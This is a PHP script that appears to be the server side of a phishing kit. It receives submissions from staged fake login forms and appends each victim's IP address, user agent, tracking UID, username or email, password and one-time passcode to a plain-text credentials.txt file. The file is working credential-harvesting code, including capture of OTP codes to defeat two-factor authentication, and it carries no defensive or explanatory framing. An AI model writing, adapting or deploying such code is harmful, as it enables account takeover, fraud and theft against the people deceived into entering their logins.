<?php
// Check if the request contains data to be processed
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the current timestamp
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Get the UID from the POST request
    $uid = isset($_POST['uid']) ? $_POST['uid'] : 'unknown_uid';
    
    // Log the POST data to ensure we're getting the UID correctly
    error_log('POST Data: ' . print_r($_POST, true)); // Log all POST data

    // Initialize a single-line data string
    $data = "[$timestamp] | UID: $uid | IP: $ip | User Agent: $userAgent";

    // Check which form was submitted based on the presence of specific fields
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'username':
                if (isset($_POST['username'])) {
                    $username = $_POST['username'];
                    $data .= " | Username/Email: $username";
                }
                break;
                
            case 'password':
                if (isset($_POST['username']) && isset($_POST['password'])) {
                    $username = $_POST['username'];
                    $password = $_POST['password'];
                    $data .= " | Username/Email: $username | Password: $password";
                }
                break;
                
            case 'otp':
                if (isset($_POST['username']) && isset($_POST['otp'])) {
                    $username = $_POST['username'];
                    $otp = $_POST['otp'];
                    $data .= " | Username/Email: $username | OTP Code: $otp";
                }
                break;
        }
        
        // Append the data to credentials.txt
        file_put_contents('credentials.txt', $data . "\n", FILE_APPEND);
        
        // Return success response
        echo json_encode(['status' => 'success']);
        exit;
    }
}

// If no valid POST request was detected
echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
?>
